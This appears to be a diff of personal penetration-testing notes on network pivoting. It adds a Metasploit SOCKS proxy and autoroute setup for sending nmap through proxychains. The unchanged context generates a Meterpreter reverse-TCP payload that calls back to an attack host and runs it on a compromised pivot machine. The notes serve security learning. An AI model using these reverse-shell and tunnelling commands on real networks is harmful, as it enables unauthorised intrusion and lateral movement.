@@ -55,10 +55,10 @@ $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attack_host_IP> -f elf -o
 msf6 > use exploit/multi/handler
 > set payload linux/x64/meterpreter/reverse_tcp
 > set lhost 0.0.0.0
-> set lport 8000
+> set lport 8080
 > run
 
-[*] Started reverse TCP handler on 0.0.0.0:8000
+[*] Started reverse TCP handler on 0.0.0.0:8080
 ```
 3. We can then copy the payload over to the pivot host and execute it, this will form the meterpreter reverse connection back to our handler
 4. From here we can use modules like `post/multi/gather/ping_sweep` or bash to search for targets on the internal networks etc (*remember windows blocks ICMP requests normally*)
@@ -73,7 +73,39 @@ for /L %i in (1 1 254) do ping x.x.x.%i -n 1 -w 100 | find "Reply"
 ```
 > It is often worth performing these checks at least twice as sometimes the system will need time to build its arp cache. This could mean that some systems may not result in a successful reply on the first attempt.
 
-If a host's firewall blocks ICMP requests (pings) then we will have to 
+If a host's firewall blocks ICMP requests (pings) then we will have to use nmap's TCP scan instead.
+### Socks proxy with Metasploit
+1. We can use the `socks_proxy` module in [[Metasploit]] to configure a local SOCKS proxy on our attack machine.
+```bash
+msf6 > use auxiliary/server/socks_proxy
+
+# makes the proxy listen on 0.0.0.0:9050
+> set SRVPORT 9050
+> set SRVHOST 0.0.0.0
+# Use SOCKS version 4a
+> set version 4a
+> run
+
+# Confirm proxy server is running
+> jobs
+```
+2. We can then configure [[Proxychains]] to do the routing for our tools
+![[Proxychains#Configuration]]
+3. We need to make the `socks_proxy` route all the traffic via our existing [[#Tunnelling with Meterpreter|Meterpreter session]] with `autoroute`
+```bash
+msf6 > use post/multi/manage/autoroute
+
+> set SESSION 1
+> set SUBNET <our_target_internal_subnet>
+> run
+```
+> this is possible to do directly in the meterpreter session with `run autoroute -s <subnet>` but it is deprecated.
+> We can see all the routes in the meterpreter session with `run autoroute -p`
+
+4. Finally, we can run our tool (`nmap`) through [[Proxychains]] which will route through our [[#Tunnelling with Meterpreter|Meterpreter session]].
+```bash
+$ proxychains nmap ...
+```
 
 ## Port Forwarding
 Port forwarding is *redirecting a communication request from one port to another*. TCP is used as the primary communication layer but application layer protocols like SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. Port forwarding can be a useful technique for bypassing firewalls and using existing services on the compromised host to pivot to other networks.
